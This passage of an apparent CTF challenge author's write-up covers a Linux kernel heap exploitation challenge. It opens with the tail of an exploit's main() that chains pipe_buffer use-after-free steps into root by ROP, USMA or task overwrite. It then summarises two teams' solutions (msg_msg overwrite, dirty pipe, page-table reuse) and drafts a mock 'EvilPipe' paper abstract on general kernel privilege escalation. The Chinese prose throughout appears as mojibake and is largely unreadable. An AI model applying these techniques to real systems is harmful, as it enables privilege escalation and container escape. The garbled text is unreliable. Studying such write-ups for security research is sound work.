pages</span><br><span class="hljs-comment">     */</span><br>    corrupting_first_level_pipe_for_page_uaf();<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.II - re-allocate the victim page to pipe_buffer,</span><br><span class="hljs-comment">     * leak page-related address and construct a second-level pipe uaf</span><br><span class="hljs-comment">     */</span><br>    corrupting_second_level_pipe_for_pipe_uaf();<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.III - re-allocate the second-level victim page to pipe_buffer,</span><br><span class="hljs-comment">     * construct three self-page-pointing pipe_buffer </span><br><span class="hljs-comment">     */</span><br>    building_self_writing_pipe();<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.IV - leaking fundamental information by pipe</span><br><span class="hljs-comment">     */</span><br>    info_leaking_by_arbitrary_pipe();<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.V - different method of exploitation</span><br><span class="hljs-comment">     */</span><br><br>    <span class="hljs-keyword">if</span> (argv[<span class="hljs-number">1</span>] &amp;&amp; !<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;rop&quot;</span>)) &#123;<br>        <span class="hljs-comment">/* traditionally root by rop */</span><br>        privilege_escalation_by_rop();<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (argv[<span class="hljs-number">1</span>] &amp;&amp; !<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;cfi&quot;</span>)) &#123;<br>        <span class="hljs-comment">/* extra - check for CFI&#x27;s availability */</span><br>        trigger_control_flow_integrity_detection();<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (argv[<span class="hljs-number">1</span>] &amp;&amp; !<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;usma&quot;</span>)) &#123;<br>        privilege_escalation_by_usma();<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">/* default: root by seeking init_task and overwrite current */</span><br>        privilege_escalation_by_task_overwrite();<br>    &#125;<br><br>    <span class="hljs-comment">/* we SHOULDN&#x27;T get there, so panic :( */</span><br>    trigger_control_flow_integrity_detection();<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="0x03-è§£é¢˜æƒ…å†µ"><a href="#0x03-è§£é¢˜æƒ…å†µ" class="headerlink" title="0x03.è§£é¢˜æƒ…å†µ"></a>0x03.è§£é¢˜æƒ…å†µ</h1><p>æœ¬æ¬¡æ¯”èµ›å½“ä¸­ä¸€å…±æœ‰ 2 æ”¯é˜Ÿä¼è§£å‡ºäº†ç¬”è€…çš„é¢˜ç›®ï¼Œè¿™ä¸ªæ•°é‡å€’æ˜¯å‡ºä¹ç¬”è€…çš„é¢„æ–™åˆåœ¨é¢„æ–™ä¹‹ä¸­ï¼ˆ<del>æ—¢æ„Ÿè§‰å¥½å¤šåˆæ„Ÿè§‰å¥½å°‘</del>ï¼‰ï¼Œæ¯”è¾ƒå·§çš„æ˜¯ <em>åˆšå¥½ä¸€æ”¯å›½å†…é˜Ÿä¼ä¸ä¸€æ”¯å›½å¤–é˜Ÿä¼</em> ï¼šï¼‰</p><p>NU1L æˆ˜é˜Ÿçš„è§£æ³•æ˜¯åˆ©ç”¨ partial overwrite è¦†å†™ <code>msg_msg-&gt;m_list.next</code> æ„é€  UAFï¼ˆæœ‰ç‚¹åƒ CVE-2021-22555 çš„è§£æ³•ï¼‰ï¼Œåˆ†é… <code>msg_msgseg</code> æ¥æ„é€  <code>fake msg_msg</code> å®ç°è¶Šç•Œè¯»ï¼Œä¹‹ååˆ©ç”¨ <code>fcntl(F_SETPIPE_SZ)</code> æ”¹å° <code>pipe_buffer</code> åè½¬ç§» UAF åˆ° <code>pipe_buffer</code> ä¸Šä»è€Œæ„é€  dirty pipe è¦†å†™ busyboxï¼Œä¸è¿‡æ¯”è¾ƒå‡ºä¹ç¬”è€…é¢„æ–™çš„æ˜¯ä»–ä»¬å¹¶æ²¡æœ‰ç”¨é¡µçº§å †é£æ°´ï¼Œè€Œæ˜¯é€‰æ‹©<strong>ç›´æ¥å †å–·å¤§é‡ msg_msg</strong>ï¼Œè¿™æ ·é¢˜ç›®æ‰€åœ¨çš„ slub é¡µé¢ä¸ <code>msg_msg</code> æ‰€åœ¨ slub é¡µé¢ä¾¿è¿˜æ˜¯æœ‰ä¸€å®šå‡ ç‡æŒ¨åˆ°ä¸€èµ·ï¼ˆç”±äºå¤§å° 0x1000 çš„ <code>msg_msg</code> æ‰€åœ¨ slab <strong>åŒæ ·æ¥è‡ªäº order-3</strong>ï¼Œå› æ­¤å®é™…ä¸Šä»…çº¯å †å–·ä¹Ÿæœ‰ä¸€å®šçš„å‡ ç‡ä½¿å¾—å¯¹åº” slab æŒ¨åœ¨ä¸€èµ·ï¼‰</p><p>TeamGoulash çš„è§£æ³•å‰åŠæ®µä¸å®˜æ–¹è§£æ³•çš„ä¸­æ®µåŸºæœ¬ä¸Šæ˜¯ä¸€è‡´çš„ï¼Œå³åˆ©ç”¨  <code>fcntl(F_SETPIPE_SZ)</code> æ”¹å¤§  <code>pipe_buffer</code> åˆ° order-3 åé€šè¿‡å¯¹ page æŒ‡é’ˆçš„ partial overwrite æ„é€  page-level çš„ UAFï¼Œä¹‹ååœ¨ UAF page ä¸Šåˆ†é…æ–°çš„ <code>pipe_buffer</code> ï¼Œä¸è¿‡ä»–ä»¬å¹¶æ²¡æœ‰åƒç¬”è€…é‚£æ ·ç»§ç»­æ„é€ è‡ªè¯»å†™ç®¡é“æ¥å®Œæˆå†…å­˜ç©ºé—´ä»»æ„è¯»å†™ï¼Œ<strong>è€Œæ˜¯å°† UAF page åˆ†é…ä¸ºæ–°è¿›ç¨‹çš„é¡µè¡¨é¡µé¢</strong>ï¼ˆç”±äº COW æœºåˆ¶ï¼Œ<code>fork()</code> åˆ›å»ºæ–°è¿›ç¨‹çš„è¿‡ç¨‹ä¸­å…¶å®ä»…ä¼šåˆ†é…æ–°çš„é¡µè¡¨é¡¹åŠå…¶ä»–å†…æ ¸ç»“æ„ä½“ï¼Œè¿™ä½¿å¾—æˆ‘ä»¬æœ‰ä¸å°çš„æ¦‚ç‡ä½¿ UAF é¡µé¢è¢«å¤ç”¨ä¸ºé¡µè¡¨ä¸­çš„æŸä¸€çº§é¡µé¢ï¼‰ï¼Œä¹‹å<strong>å°† busybox æ˜ å°„åˆ° UAF é¡µè¡¨é¡¹å¯¹åº”çš„å†…å­˜ç©ºé—´ï¼Œä»è€Œå®Œæˆè¶Šæƒå†™å…¥</strong>ï¼Œç”±äºç¼ºä¹æœ‰æ•ˆçš„å †é£æ°´æ‰‹æ®µä»¥åŠé¡µåˆ†é…çš„ä¸ç¨³å®šæ€§å¯¼è‡´<strong>æˆåŠŸç‡è¾ƒä½</strong>ï¼ˆæ¯•ç«Ÿåˆ†é…è¿‡ç¨‹å½“ä¸­è¿˜æ˜¯æœ‰éå¸¸å¤šçš„å™ªéŸ³ï¼Œæ®è¯¥æˆ˜é˜Ÿè‡ªè¿°æˆåŠŸç‡åªæœ‰ 5%ï¼‰</p><blockquote><p>ä»¥åŠ TeamGoulash ä¸ºç¬”è€…å±•ç°äº†ä¸€ä¸ªå¾ˆæœ‰è¶£çš„æ“ä½œï¼šé€šè¿‡ç¡çœ ä¸€å®šçš„æ—¶é—´ä½¿å¾—æ—§çš„ TLB æ— æ•ˆåŒ–</p><p><img src="https://s2.loli.net/2023/05/01/SFKbgnzPJdIYUZT.png" alt="TeamGoulash åœ¨ WP ä¸­çš„è¡¨æƒ….jpg"></p></blockquote><p>ä¸¤åªæˆ˜é˜Ÿçš„è§£æ³•å¤§ä½“ä¸Šå…¶å®éƒ½åœ¨é¢„æœŸä¹‹å†…ï¼ˆç¬”è€…ä¸€å¼€å§‹æƒ³çš„å°±æ˜¯åˆ©ç”¨ <code>msg_msg</code> ï¼‰ï¼ŒåŒæ—¶è¿™é“é¢˜ç›®æ²¡æœ‰å‡ºç°å»å¹´é‚£æ ·çš„å¤§é¢ç§¯éé¢„æœŸæƒ…å†µï¼Œå¯å–œå¯è´ºå¯å–œå¯è´ºğŸ‘ğŸ‘ğŸ‘</p><h1 id="0x04-æ€»ç»“ä¸åæ€"><a href="#0x04-æ€»ç»“ä¸åæ€" class="headerlink" title="0x04. æ€»ç»“ä¸åæ€"></a>0x04. æ€»ç»“ä¸åæ€</h1><p>æ¯«ä¸è°¦è™šåœ°è¯´ï¼Œç¬”è€…è®¤ä¸ºè‡ªå·±å‡ºçš„è¿™é“é¢˜ç›®åœ¨å¯¹äºå†…æ ¸ä¸­å†…å­˜æŸåç±»å‹æ¼æ´çš„ â€œé€šè§£â€ çš„æ¢ç´¢ç›¸æ¯”<a href="https://arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP">å»å¹´</a>è€Œè¨€æ˜¯æœ‰ç€ä¸€å®šè·ç¦»çš„çªç ´çš„â€”â€”æˆ‘ä»¬æˆåŠŸåœ¨ä¸€ä¸ªéå¸¸æç«¯çš„ç¯å¢ƒä¸‹å®Œæˆäº†å†…æ ¸æ¼æ´åˆ©ç”¨</p><p>è€Œå¦‚æœå°†å®˜æ–¹è§£åœ¨ä¸åŒæ¼æ´åœºæ™¯ä¸‹è¿›è¡Œæ¨å¹¿ï¼Œå¾—ç›Šäº <code>pipe_buffer</code> å¤§å°çš„å¯è°ƒèŠ‚æ€§ä»¥åŠæ— éœ€ <code>bzImage</code> ä¿¡æ¯ä¾¿èƒ½å®Œæˆææƒçš„ä¾¿æ·æ€§ï¼Œæˆ‘ä»¬ä¸éš¾å‘ç°çš„æ˜¯<strong>è¿™ä¸ªæ–¹æ³•å¯ä»¥è¢«å¾ˆå¿«åœ°åº”ç”¨å¹¶æ¨å¹¿åˆ°ç»å¤§éƒ¨åˆ†çš„æ¼æ´ä¸Šï¼Œå¹¶åœ¨çœŸå®åœºæ™¯ä¸‹å®Œæˆæ¼æ´åˆ©ç”¨</strong>ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆç¬”è€…è¦é­”æ”¹ã€Ševaï¼šç»ˆã€‹çš„å®£ä¼ è¯­æ¥ä½œä¸ºé¢˜ç›®æè¿°â€”â€”<strong>æˆ‘ä»¬æˆ–è®¸çœŸçš„ä¸ºå†…æ ¸å†…å­˜æŸåå‹æ¼æ´æ‰¾åˆ°äº†ä¸€ç§è¶³å¤Ÿå¼ºå¤§çš„é€šæ³•ï¼šï¼‰</strong></p><p>ä¸è¿‡è¿™ç§æ–¹æ³•å¹¶éæ˜¯ç¬”è€…ç¬¬ä¸€ä¸ªå‘ç°çš„ï¼ˆè™½ç„¶ç¬”è€…ä¸€å¼€å§‹ç¡®ä¹è¿™ä¹ˆä»¥ä¸ºï¼‰ï¼Œæ®ç¬”è€…äº†è§£ç±»ä¼¼çš„æ”¹å†™ <code>pipe_buffer.page</code> çš„æ–¹æ³•ä¼¼ä¹æ—©å·²è¢«åº”ç”¨åˆ°å®æˆ˜çš„å®‰å“æ”»é˜²å½“ä¸­ï¼ŒåŒæ—¶<a href="https://interruptlabs.co.uk/labs/pipe_buffer/">æ¥è‡ª Interrupt Labs çš„ç ”ç©¶å‘˜ä¹Ÿåœ¨å»å¹´å‘ç°äº†è¿™ç§æ–¹æ³•</a></p><blockquote><p>è¯¥ Lab çš„å®‰å…¨ç ”ç©¶å‘˜ä¸€å¼€å§‹ä¹Ÿä»¥ä¸ºè‡ªå·±ç‹¬ç«‹å‘ç°äº†ä¸€ç§æ–°æ–¹æ³•ï¼Œç»“æœä¸€çœ‹ <a href="https://i.blackhat.com/USA-22/Wednesday/US-22-Jin-Monitoring-Surveillance-Vendors.pdf">BlackHat ä¸Šå¥½åƒè®²è¿‡åœ¨å®‰å“ä¸Šå·²ç»å­˜åœ¨åœ¨é‡åˆ©ç”¨äº†</a>ï¼Œ<del>å’Œç¬”è€…åŒç—…ç›¸æ€œå±äºæ˜¯</del></p></blockquote><p>è™½ç„¶è¯´è¿™ç§æ–¹æ³•ä¼¼ä¹æ²¡æœ‰è¢«æ­£å¼å‘½åï¼Œä½†æ˜¯æ—¢ç„¶æ—©å°±å­˜åœ¨åœ¨é‡åˆ©ç”¨çš„è¯é‚£è‡ªç„¶ç¬”è€…æ˜¯æ²¡æœ‰å‘½åèµ„æ ¼äº†ï¼Œè‡³å°‘ç¬”è€…ä¸ä¼šä¸ºäº†æ‰€è°“ â€œé’å²ç•™åâ€ è€Œæ“…è‡ªå°†è¿™ç§æ—©å°±å‡ºç°è¿‡çš„åˆ©ç”¨æ–¹æ³•å† ä¸Šè‡ªå·±çš„åå­—ï¼ˆç¬‘ï¼‰</p><!--glibc åˆ©ç”¨è¿‘å‡ å¹´å›½å†…æ–°å‡ºç°çš„å°‘æ•°å‡ ä¸ªæ‰€è°“ â€œhouse of xxâ€ åœ¨ç¬”è€…çœ‹æ¥çœŸçš„æ˜¯éš¾ä»¥å½¢å®¹......è¿™ä¹Ÿæ˜¯ç¬”è€…ä¸ºä»€ä¹ˆæœ€è¿‘åŸºæœ¬ä¸Šæ²¡æœ‰åœ¨åšå¸¸è§„çš„ Linux ç”¨æˆ·æ€ pwn çš„ç¼˜æ•…ï¼ˆå½“ç„¶è™šæ‹ŸåŒ–é€ƒé€¸è¿˜æ˜¯æŒºæœ‰æ„æ€çš„ï¼‰ï¼Œæ–°å‡ºç°çš„ä¸€äº›ä¸œè¥¿æœ‰ç‚¹è¿‡äºæµ®èºä¸”æµ®å¤¸äº†ï¼š( \nå½“ç„¶è¿™å¹¶ä¸ä»£è¡¨ç¬”è€…è®¤ä¸ºè¿™äº›äººæˆ–æ˜¯è¿™äº›äº‹æƒ…æ¶å¿ƒï¼Œä¹Ÿä¸ä»£è¡¨ç¬”è€…å¯¹è¿™æ ·çš„ç°è±¡çš„ä¸€ç§æ‰¹åˆ¤--><p>æ€»çš„æ¥è¯´ï¼Œç¬”è€…å¯¹äºè‡ªå·±ä»Šå¹´æ‰€å‡ºçš„è¿™ä¸€é“é¢˜è¿˜æ˜¯æŒºæ»¡æ„çš„ï¼Œå¸Œæœ›æœªæ¥èƒ½å¤Ÿç»™å¤§å®¶å¸¦æ¥æ›´å¤šæ›´æœ‰è¶£çš„å†…æ ¸æ¼æ´åˆ©ç”¨æ‰‹æ³• ï¼šï¼‰</p><h1 id="0xFF-ä¸€äº›å°å½©è›‹"><a href="#0xFF-ä¸€äº›å°å½©è›‹" class="headerlink" title="0xFF. ä¸€äº›å°å½©è›‹"></a>0xFF. ä¸€äº›å°å½©è›‹</h1><blockquote><p>ç¬”è€…ä¸ªäººå‘ç–¯éƒ¨åˆ†ï¼Œè¿™é‡Œå¯ä»¥ä¸ç”¨çœ‹äº†ï¼ˆç¬‘ï¼‰</p></blockquote><p>æœ€è¿‘å†™è®ºæ–‡å†™å¾—å¿«ç–¯é­”äº†ï¼Œæ‰€ä»¥ç¬”è€…ä¸ºè¿™é“é¢˜ç›®ä¹Ÿç®€å•å†™äº†ä¸€æ®µï¼šï¼‰</p><blockquote><p>ã€Š<strong>EvilPipe: Another General Exploitation Method On Linux kernel Vulnerabilities</strong>ã€‹</p><p><strong>Abstract</strong></p><p>åœ¨å®æˆ˜ä¸­å¯¹ Linux kernel çš„å†…å­˜æŸåæ¼æ´è¿›è¡Œåˆ©ç”¨å¾€å¾€éœ€è¦é¢ä¸´è¯¸å¤šæŒ‘æˆ˜ï¼Œæ¥è‡ªç¡¬ä»¶ä¸è½¯ä»¶å±‚é¢çš„è¯¸å¤šä¿æŠ¤ä½¿å¾—æ¼æ´åˆ©ç”¨å˜å¾—å›°éš¾ï¼Œå†…æ ¸é•œåƒä¿¡æ¯çš„ç¼ºå¤±ä¹Ÿä»¤åˆæ³•æ”»å‡»è½½è·çš„æ„é€ å˜å¾—ä¸å¯èƒ½ï¼›ç°æœ‰çš„ä¸€äº›å·¥ä½œä¹Ÿåœ¨å°è¯•å¯»æ‰¾æ— éœ€è¿›è¡Œæ§åˆ¶æµåŠ«æŒçš„æ›´å…·æœ‰é€šç”¨æ€§çš„æ”»å‡»æ‰‹æ³•ï¼Œå¦‚ Pipe Primitive é€‰æ‹©å°†æ¼æ´å½¢å¼è½¬æ¢ä¸º DirtyPipe å®Œæˆåˆ©ç”¨ï¼ŒDirtyCred åˆ™å°†æ¼æ´è½¬æ¢ä¸ºå¯¹å†…æ ¸ä¸­çš„ credentials ç»“æ„ä½“çš„æ”¹å†™ä»¥å®Œæˆåˆ©ç”¨ï¼›ä½†è¿™äº›åˆ©ç”¨æ‰‹æ³•å¾€å¾€ä»éœ€è¦ä¸€å®šçº§åˆ«çš„æƒé™ï¼ˆä¾‹å¦‚ï¼Œè‡³å°‘éœ€è¦èƒ½å¤Ÿè¯»å–æˆ–æ‰§è¡Œç‰¹æƒæ–‡ä»¶ï¼‰ï¼Œä»ç„¶ç¼ºä¹è¶³å¤Ÿçš„é€šç”¨æ€§</p><p>æœ¬æ–‡ä»‹ç» EvilPipeâ€”â€”ä¸€ç§æ›´å…·æœ‰é€šç”¨æ€§çš„åˆ©ç”¨æ‰‹æ³•ï¼Œè¿™é¡¹æŠ€æœ¯å…è®¸æˆ‘ä»¬å°†ç»å¤§å¤šæ•°çš„å†…æ ¸ä¸­çš„å†…å­˜æŸåæ¼æ´ï¼ˆç”šè‡³ä»…æ˜¯ä¸€ä¸ª â€˜\0â€™ å­—èŠ‚çš„å †æº¢å‡ºï¼‰ï¼Œè½¬æ¢ä¸ºæ— éœ€ä»»ä½•ç‰¹æƒçš„æ— é™çš„å¯¹ç‰©ç†å†…å­˜çš„ä»»æ„è¯»å†™èƒ½åŠ›ï¼Œå¹¶èƒ½å®Œç¾ç»•è¿‡åŒ…æ‹¬ KASLRã€SMEPã€SMAP åœ¨å†…çš„å¤šé¡¹ä¸»æµç¼“è§£æªæ–½ï¼›æœ‰äº† EvilPipeï¼Œä¸€ä¸ªæ¶æ„çš„æœ¬åœ°æ”»å‡»è€…å¯ä»¥åœ¨æ— éœ€å†…æ ¸é•œåƒä¿¡æ¯çš„æƒ…å†µä¸‹é€šè¿‡å·²çŸ¥çš„å†…æ ¸æ¼æ´å®Œæˆææƒä¸å®¹å™¨é€ƒé€¸ï¼›æˆ‘ä»¬åœ¨å¤šä¸ªä¿æŠ¤å®Œå¤‡çš„ Linux ç³»ç»Ÿä¸‹å¯¹å¤šä¸ª <code>ï¼ˆæ­¤å¤„æš‚å®šï¼‰</code> çœŸå®ä¸–ç•Œä¸­çš„æ¼æ´å®Œæˆäº†å¯¹è¿™ç§åˆ©ç”¨æ‰‹æ³•çš„è¯„ä¼°ï¼Œå¹¶å‘ç° EvilPipe åœ¨å¤šä¸ª <code>ï¼ˆæ­¤å¤„æš‚å®šï¼‰</code> çœŸå®ä¸–ç•Œçš„æ¼æ´ä¸Šå¯ä»¥å®Œæˆåˆ©ç”¨ï¼Œè¿™æ„å‘³ç€è¿™é¡¹æŠ€æœ¯çš„é€šç”¨æ€§ï¼›åœ¨å®Œæˆå¯ç”¨æ€§è¯„ä¼°ä¹‹åï¼Œæˆ‘ä»¬æå‡ºäº†ä¸€ç§æ–°çš„ä¿æŠ¤æœºåˆ¶ï¼Œé€šè¿‡åœ¨æ•°æ®æ‹·è´å‰æ·»åŠ é¢å¤–çš„éªŒè¯æœºåˆ¶ä»¥é˜²æ­¢ EvilPipe ç±»å‹çš„åˆ©ç”¨æ–¹æ³•ï¼Œç»å®éªŒè¯„ä¼°ï¼Œæˆ‘ä»¬æ‰€æå‡ºçš„æ–°æœºåˆ¶å¸¦æ¥çš„è´Ÿæ‹…æ˜¯å¯ä»¥å¿½ç•¥ä¸è®¡çš„</p><p><strong>KEYWORDS</strong></p><p>OS Security; Kernel Exploitation; Privilege Escalation</p><p><strong>1 INTRODUCTION</strong></p><p>ç°å¦‚ä»Š Linux å·²ç„¶æˆä¸ºå…¨ä¸–ç•Œæœ€ä¸ºæµè¡Œçš„å¼€æºæ“ä½œç³»ç»Ÿï¼Œå¾—ç›Šäºå…¶å¼€æºçš„ç‰¹æ€§ä¸ä¼˜ç§€çš„è®¾è®¡ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨åŒ…æ‹¬äº‘æœåŠ¡å™¨ã€ç§»åŠ¨è®¾å¤‡ã€ç‰©è”ç½‘è®¾å¤‡ã€ç½‘ç»œåŸºç¡€è®¾æ–½åœ¨å†…çš„ç»å¤§éƒ¨åˆ†è®¾å¤‡ä¸Šçœ‹åˆ° Linux å†…æ ¸çš„èº«å½±ï¼Œè€Œæé«˜çš„æµè¡Œæ€§ä¹Ÿä»¤ Linux å¸å¼•äº†æ— æ•°ç½‘ç»œæ”»å‡»è€…ä¸é»‘å®¢ä»¬çš„å…´è¶£ã€‚è™½ç„¶ Linux å†…æ ¸æ¯å¹´è¢«çˆ†å‡ºçš„æ¼æ´é«˜è¾¾æ•°ç™¾ä¸ª[3]ï¼Œä½†åœ¨å®æˆ˜ä¸­å¯¹å†…æ ¸æ¼æ´çš„åˆ©ç”¨å¾€å¾€é¢ä¸´ç€ä¸€ç³»åˆ—å›°éš¾çš„æŒ‘æˆ˜ã€‚ä»å†…æ ¸å±‚é¢è€Œè¨€ï¼Œè¯¸å¦‚ KASLR[1]ã€KPTI [2]ã€ CFI[4] ç­‰ä¿æŠ¤ä¸ºæ§åˆ¶æµåŠ«æŒæ”»å‡»å¢æ·»äº†ä¸å°‘éš¾åº¦ã€‚ä»ç¡¬ä»¶å±‚é¢è€Œè¨€ï¼Œ SMEPã€SMAPã€NX-bit ç­‰ä¿æŠ¤ä¹Ÿä»¤å½¢å¦‚ ret2usr[5]ã€ret2dir[5] è¿™æ ·çš„æ”»å‡»å˜å¾—æä¸ºå›°éš¾ã€‚å†…æ ¸é•œåƒä¿¡æ¯çš„ç¼ºå¤±æ›´æ˜¯ä½¿å¾—æ”»å‡»è€…æ— æ³•è·å–åˆ°å†…æ ¸ä»£ç ç‰‡æ®µçš„å…·ä½“ä¿¡æ¯ï¼Œä»è€Œä½¿å¾—ç±»ä¼¼ ROP&#x2F;JOP è¿™æ ·çš„åˆ©ç”¨æ‰‹æ³•éš¾ä»¥è¢«åº”ç”¨ã€‚</p><p>ç›¸è¾ƒäºåŠ«æŒå†…æ ¸çš„æ‰§è¡Œæµï¼Œåœ¨å®æˆ˜ä¸­æ›´å—äººé’ççš„å†…æ ¸æ¼æ´åˆ™æ˜¯æ— éœ€ç‰¹å®šäºæŸä¸ªå†…æ ¸äºŒè¿›åˆ¶ä¿¡æ¯çš„é€»è¾‘ç±»æ¼æ´ã€‚æ›¾ç»éå¸¸ç«çƒ­çš„ CVE-2016-5195ï¼ˆä¹Ÿè¢«ç§°ä¸º â€œDirtyCOWâ€ï¼‰ä¾¿æ˜¯ä¸€ä¸ªéå¸¸ç»å…¸çš„è¿™æ ·çš„é€»è¾‘æ¼æ´ï¼Œå…¶é€šè¿‡ Linux å†…æ ¸ä¸­çš„æ¡ä»¶ç«äº‰æ¼æ´å®Œæˆå¯¹ç‰¹æƒæ–‡ä»¶çš„è¶Šæƒå†™å…¥ä»¥è¿›è¡Œææƒï¼Œè€Œä¸éœ€è¦ç›´æ¥å¯¹æŠ—å†…æ ¸ä¸­çš„è¯¸å¤šå®‰å…¨æœºåˆ¶ï¼Œè¿™ä½¿å¾—è¿™ä¸ªæ¼æ´èƒ½å¤Ÿé€‚ç”¨äºå®æˆ˜ä¸­çš„å¤šä¸ªä¸åŒçš„å¤æ‚åœºæ™¯ã€‚CVE-2022-0847ï¼ˆä¹Ÿè¢«ç§°ä¸ºâ€œDirtyPipeâ€ï¼‰ç”±äºå…¶ç±»ä¼¼çš„é€šç”¨æ€§äºå»å¹´åœ¨å®‰å…¨ç•Œå˜å¾—æµè¡Œï¼Œå…¶ä¸ºä¸€ä¸ªå¯¹ pipe ç»“æ„ä½“ä¸­æ ‡å¿—ä½çš„é”™è¯¯è®¾ç½®ï¼Œè¿™å¯ä»¥ä½¿å¾—æ”»å‡»è€…åˆ©ç”¨è¯¥æ¼æ´å®Œæˆå¯¹ç‰¹æƒæ–‡ä»¶çš„è¶Šæƒå†™å…¥ä»¥è¿›è¡Œææƒï¼Œè€Œä¸éœ€è¦ç›´æ¥å¯¹æŠ—å†…æ ¸ä¸­çš„å¤šç§ä¿æŠ¤ã€‚</p><p>åœ¨æœ¬æ–‡ä¸­æˆ‘ä»¬æå‡ºäº†ä¸€ç§æ›´ä¸ºé€šç”¨ã€å¼ºå¤§çš„åˆ©ç”¨æ–¹æ³•ï¼Œç§°ä¹‹ä¸º EvilPipeã€‚è¿™é¡¹æŠ€æœ¯åˆ©ç”¨äº†å†…æ ¸ä¸­ç®¡é“ç»“æ„ä½“çš„å¯é‡åˆ†é…æ€§ä¸é«˜åº¦çµæ´»æ€§ï¼Œè¿™å…è®¸æˆ‘ä»¬å°†ç»å¤§å¤šæ•°çš„å†…æ ¸ä¸­çš„å†…å­˜æŸåæ¼æ´ï¼ˆç”šè‡³ä»…æ˜¯ä¸€ä¸ª â€˜\0â€™ å­—èŠ‚çš„å †æº¢å‡ºï¼‰ï¼Œè½¬æ¢ä¸ºæ— éœ€ä»»ä½•ç‰¹æƒçš„è¿‘ä¹æ— é™çš„å¯¹ç‰©ç†å†…å­˜çš„ä»»æ„è¯»å†™èƒ½åŠ›ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ç§åˆ©ç”¨æ–¹æ³•è·å–å¯¹å†…æ ¸çš„å®Œå…¨æ§åˆ¶æƒï¼Œä»è€Œæ— éœ€ç›´æ¥å¯¹æŠ—ä»»ä½•ä¸»æµçš„ä¿æŠ¤æªæ–½ä¾¿èƒ½å®Œæˆå†…æ ¸ææƒä¸å®¹å™¨é€ƒé€¸çš„å·¥ä½œã€‚åŒæ—¶ï¼Œè¿™é¡¹æŠ€æœ¯å¹¶ä¸éœ€è¦ä»»ä½•æ›´é«˜çš„ç³»ç»Ÿæƒé™ï¼ˆä¾‹å¦‚ï¼Œè¯»å– &#x2F;etc&#x2F;passwdï¼‰ï¼Œä¹Ÿä¸ä¾èµ–äºç³»ç»Ÿç¯å¢ƒä¸­çš„ä»»ä½•ç‰¹æƒæ–‡ä»¶ï¼ˆä¾‹å¦‚ï¼Œ pkexecï¼‰ï¼Œä¸”ä¸éœ€è¦ä»»ä½•é¢å¤–çš„ç‰¹å®šäºå†…æ ¸é•œåƒçš„å†…æ ¸ä¿¡æ¯ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥åœ¨ç»å¤§éƒ¨åˆ†å­˜åœ¨å·²çŸ¥æ¼æ´çš„Linuxç³»ç»Ÿä¸Šç›´æ¥åº”ç”¨è¿™ç§åˆ©ç”¨æ‰‹æ³•å®Œæˆæ”»å‡»ï¼Œå› æ­¤è¿™ç§æ–¹æ³•åœ¨å®æˆ˜å½“ä¸­å…·æœ‰æé«˜çš„å¯ç”¨æ€§ã€‚</p><p>ç›¸æ¯”äºå…¶ä»–çš„åˆ©ç”¨æŠ€æœ¯ï¼Œ EvilPipe æœ‰ç€å¦‚ä¸‹ä¼˜ç‚¹ã€‚é¦–å…ˆï¼ŒEvilPipe çš„æ ¸å¿ƒä»…æ˜¯ pipe ç³»ç»Ÿè°ƒç”¨ï¼Œä½œä¸ºä¸€ä¸ªåŸºç¡€è®¾æ–½ pipe ç³»ç»Ÿè°ƒç”¨åœ¨æ¯ä¸€ä¸ªåŸºäº Linux çš„ç³»ç»Ÿä¸Šéƒ½æ˜¯å¯ä»¥ä½¿ç”¨çš„ï¼Œè¿™æ„å‘³ç€ EvilPipe è¿‘ä¹ä¸å­˜åœ¨ä»»ä½•çš„ä½¿ç”¨é—¨æ§›ã€‚å…¶æ¬¡ï¼ŒEvilPipe æœ‰ç€é«˜åº¦çš„çµæ´»æ€§ï¼Œå¯ä»¥å®Œç¾å¥‘åˆå¤šä¸ªä¸åŒå¤§å°çš„å†…æ ¸æ¼æ´å¯¹è±¡ã€‚å¯¹äº UAF æ¼æ´è€Œè¨€ï¼ŒEvilPipe ä»…è¦æ±‚æ¼æ´å¯¹è±¡ä¸é€šç”¨çš„ GFP_KERNEL_ACCOUNT åˆ†é…æ ‡å¿—ä½æ¥è‡ªåŒä¸€ kmem_cacheï¼ˆå†…æ ¸å½“ä¸­çš„å¤§éƒ¨åˆ†å¯¹è±¡éƒ½æ»¡è¶³è¯¥è¦æ±‚ï¼‰ã€‚å¯¹äºæº¢å‡ºæ¼æ´è€Œè¨€ï¼ŒEvilPipe çš„æœ€ä½è¦æ±‚ä»…ä¸ºä¸€ä¸ª \0 å­—èŠ‚ï¼ˆè¿™åŒæ ·é€‚ç”¨äºè·¨ kmem_cache é—´å†…å­˜é¡µçš„æº¢å‡ºï¼Œæˆ‘ä»¬å°†åœ¨åæ–‡ä½¿ç”¨ä¸€ç§åä¸ºé¡µçº§å †é£æ°´çš„æŠ€æœ¯æ¥å®Œæˆå®ƒï¼‰ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥å°†ç»å¤§éƒ¨åˆ†çš„å†…å­˜æŸåç±»æ¼æ´è½¬æ¢ä¸º EvilPipe ä»¥å®Œæˆåˆ©ç”¨ã€‚æœ€åï¼ŒEvilPipe ä¸ç›´æ¥ä¸ä»»ä½•çš„å†…æ ¸ä¿æŠ¤æªæ–½è¿›è¡Œå¯¹æŠ—ï¼Œä¹Ÿä¸éœ€è¦å…³äºå½“å‰å†…æ 